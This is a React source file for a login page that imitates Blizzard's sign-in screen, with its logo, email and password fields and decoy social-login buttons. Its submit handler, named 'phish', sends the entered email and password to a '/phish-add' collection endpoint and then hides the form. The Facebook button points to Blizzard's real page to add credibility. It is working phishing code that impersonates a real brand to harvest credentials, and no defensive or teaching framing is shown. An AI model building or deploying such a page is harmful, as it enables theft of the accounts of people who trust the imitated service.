import React from "react";

import axios from "axios";

import { faFacebookSquare } from "@fortawesome/free-brands-svg-icons";
import { faBan } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { library } from "@fortawesome/fontawesome-svg-core";

import blizzardLogo from "../../static/assets/images/blizzard-logo.png";
import googleLogo from "../../static/assets/images/google-logo.png";

library.add(faFacebookSquare, faBan);

const Auth = props => {
  const [userEmail, setUserEmail] = React.useState("");
  const [userPassword, setUserPassword] = React.useState("");
  //  this is a test
  const [emptyBox, makeEmptyBox] = React.useState();

  const handleEmpty = emptyField => {
    makeEmptyBox(
      <div className="empty-field-wrapper">
        <FontAwesomeIcon className="ban" icon={["fas", "ban"]} />
        <h1 className="empty-field">{emptyField}</h1>
      </div>
    );
  };
  const phish = e => {
    e.preventDefault();

    if (userEmail === "" && userPassword === "") {
      handleEmpty("Cannot Leave Fields empty");
    } else if (userEmail === "") {
      handleEmpty("Cannot leave Username empty");
    } else if (userPassword === "") {
      handleEmpty("Cannot leave Password empty");
    } else {
      setUserEmail("");
      setUserPassword("");
      props.setPage(false);
      axios({
        method: "post",
        url: "http://localhost:5000/phish-add",
        data: {
          email: userEmail,
          password: userPassword
        }
      })
        .then(() => {})
        .catch(error => console.log("KYSENJACKMAN", error));
    }
  };

  return (
    <div className="auth-wrapper">
      <img src={blizzardLogo} />
      <form onSubmit={e => phish(e)}>
        <div className="input-fields">
          {emptyBox}
          <input
            value={userEmail}
            type="text"
            placeholder="Email or Phone"
            onChange={e => setUserEmail(e.target.value)}
          />
          <input
            value={userPassword}
            type="password"
            placeholder="Password"
            onChange={e => setUserPassword(e.target.value)}
          />

          <button>Log in to Blizzard</button>
        </div>
      </form>
      <div className="divider">
        <div className="line">_________________</div>
        <p>OR LOG IN WITH</p>
        <div className="line">_________________</div>
      </div>
      <div className="face-goog">
        <button
          onClick={() =>
            (window.location.href = "https://www.facebook.com/Blizzard/")
          }
        >
          <FontAwesomeIcon
            className="facebook-logo"
            icon={["fab", "facebook-square"]}
          />
          <p>Facebook</p>
        </button>
        <div className="lil-gap" />
        <button onClick={() => props.setPage(false)}>
          <div className="google-logo-wrapper">
            <img src={googleLogo} />
          </div>
          <p>Google</p>
        </button>
      </div>
      <div className="other-links">
        <span onClick={() => props.setPage(false)}>
          Create a free Blizzard Account
        </span>
        <span onClick={() => props.setPage(false)}>Can't log in?</span>
      </div>
    </div>
  );
};

export default Auth;
